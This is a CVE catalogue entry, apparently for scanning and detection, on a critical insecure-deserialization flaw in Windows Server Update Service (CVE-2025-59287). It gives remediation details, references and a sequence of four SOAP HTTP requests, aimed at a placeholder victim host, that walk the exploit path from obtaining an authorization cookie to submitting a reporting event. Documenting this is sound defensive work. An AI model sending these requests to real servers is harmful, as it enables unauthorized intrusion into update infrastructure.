_cves/2025/cve-2025-59287.md

---
layout: "post"
cve_id: "CVE-2025-59287"
title: "Windows Server Update Service - Insecure Deserialization"
pcap: true
pcap_path: "/pcaps/2025/CVE-2025-59287.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-59287.yaml"
author: "pussycat0x,princechaddha"
severity: "critical"
impact: "Unauthenticated attackers can exploit unsafe deserialization to execute arbitrary code remotely on Windows Server Update Service systems, achieving complete server compromise.
"
remediation: "Apply the Microsoft security patches as described in the MSRC update guide for Windows Server Update Service and restrict network access to WSUS endpoints.
"
reference:
  - "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287"
  - "https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability"
  - "https://hawktrace.com/blog/CVE-2025-59287"
  - "https://research.eye.security/wsus-deserialization-exploit-in-the-wild-cve-2025-59287"
  - "https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2025-59287', 'cwe-id': 'CWE-502', 'epss-score': 0.74662, 'epss-percentile': 0.98812, 'cpe': 'cpe:2.3:o:microsoft:windows_server_2012:-:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 4, 'vendor': 'microsoft', 'product': 'windows_server_update_service', 'shodan-query': 'cpe:"cpe:2.3:o:microsoft:windows_server_2012"'}"
tags:
  - "cve"
  - "cve2025"
  - "windows"
  - "server"
  - "wsus"
  - "kev"
  - "vkev"
  - "deserialization"
  - "rce"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## 🔍 Vulnerability Description
Windows Server Update Service contains an insecure deserialization vulnerability caused by deserialization of untrusted data. An unauthorized attacker with network access can exploit this to execute arbitrary code remotely, potentially leading to full system compromise.


## 🌐 HTTP Request
```nohighlight
POST /ReportingWebService/ReportingWebService.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Connection: close
Content-Length: 358
Content-Type: text/xml
SOAPAction: "http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration"
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetRollupConfiguration xmlns="http://www.microsoft.com/SoftwareDistribution">
        <cookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
    </GetRollupConfiguration>
  </soap:Body>
</soap:Envelope>
```

```nohighlight
POST /SimpleAuthWebService/SimpleAuth.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 418
Content-Type: text/xml
SOAPAction: "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAuthorizationCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService">
      <clientId>Hw2NZu</clientId>
      <targetGroupName></targetGroupName>
      <dnsName>sD88i.local</dnsName>
    </GetAuthorizationCookie>
  </soap:Body>
</soap:Envelope>
```

```nohighlight
POST /ClientWebService/Client.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Connection: close
Content-Length: 669
Content-Type: text/xml
SOAPAction: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
<GetCookie xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
  <authCookies>
    <AuthorizationCookie>
      <PlugInId>SimpleTargeting</PlugInId>
      <CookieData>4kfzpG</CookieData>
    </AuthorizationCookie>
    </authCookies>
    <oldCookie xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
  <lastChange>2026-01-13T09:57:06Z</lastChange>
    <currentTime>2026-01-13T09:57:06Z</currentTime>
    <protocolVersion>1.20</protocolVersion>
</GetCookie>
</soap:Body>
</soap:Envelope>
```

```nohighlight
POST /ReportingWebService/ReportingWebService.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15
Content-Length: 1495
Accept: text/xml
Connection: keep-alive
Content-Type: text/xml
SOAPAction: "http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"
Accept-Encoding: gzip

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soap:Body>
<ReportEventBatch xmlns="http://www.microsoft.com/SoftwareDistribution">
<cookie>
<Expiration>2026-01-13T09:57:06Z</Expiration>
<EncryptedData>lQbWHF</EncryptedData>
</cookie>
<clientTime>2026-01-13T09:57:06Z</clientTime>
<eventBatch xmlns:q1="http://www.microsoft.com/SoftwareDistribution" soapenc:arrayType="q1:ReportingEvent[1]">
<ReportingEvent>
<BasicData>
<TargetID>
<Sid>549743e5-8546-4f9d-b946-7948711f7b69</Sid>
</TargetID>
<SequenceNumber>0</SequenceNumber>
<TimeAtTarget>2025-10-29T08:41:54.069</TimeAtTarget>
<EventInstanceID>a0ce0892-6046-4f21-856e-69ffa43876b9</EventInstanceID>
<NamespaceID>2</NamespaceID>
<EventID>389</EventID>
<SourceID>301</SourceID>
<UpdateID>
<UpdateID>00000000-0000-0000-0000-000000000000</UpdateID>
<RevisionNumber>0</RevisionNumber>
</UpdateID>
<Win32HResult>0</Win32HResult>
<AppName>LocalServer</AppName>
</BasicData>
<ExtendedData>
<MiscData soapenc:arrayType="xsd:string[2]">
<string>Administrator=SYSTEM</string>
<string>38BH1GDtTkpJBEe41T4hQkU85Rm</string>
</MiscData>
</ExtendedData>
<PrivateData>
<ComputerDnsName></ComputerDnsName>
<UserAccountName></UserAccountName>
</PrivateData>
</ReportingEvent>
</eventBatch>
</ReportEventBatch>
</soap:Body>
</soap:Envelope>
```

